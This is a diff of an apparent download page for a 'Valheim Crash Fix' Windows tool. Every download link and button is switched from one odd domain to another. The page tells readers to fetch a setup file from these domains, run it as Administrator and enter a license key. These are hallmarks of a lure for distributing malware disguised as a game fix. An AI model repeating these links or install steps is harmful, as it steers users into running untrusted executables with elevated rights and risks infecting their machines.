@@ -13,27 +13,27 @@ Fix **valheim crash on startup fix** on Windows 10/11. This page includes a **di
 > **This is the download page.** Use the button or link below to get **Valheim Crash Fix** for Windows.
 
 <p align="center">
-  <a href="https://valheim.zipzapsol.space/">
+  <a href="https://valheim.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Valheim%20Crash%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Valheim Crash Fix">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[valheim.zipzapsol.space](https://valheim.zipzapsol.space/)** |
-| **Full URL** | `https://valheim.zipzapsol.space/` |
+| **Direct link** | **[valheim.wonderchain.fun](https://valheim.wonderchain.fun/)** |
+| **Full URL** | `https://valheim.wonderchain.fun/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — valheim.zipzapsol.space](https://valheim.zipzapsol.space/)** (link above)
+1. Click **[Download — valheim.wonderchain.fun](https://valheim.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://valheim.zipzapsol.space/"><strong>⬇ Download Valheim Crash Fix now</strong></a></p>
+<p align="center"><a href="https://valheim.wonderchain.fun/"><strong>⬇ Download Valheim Crash Fix now</strong></a></p>
 
 ---
 
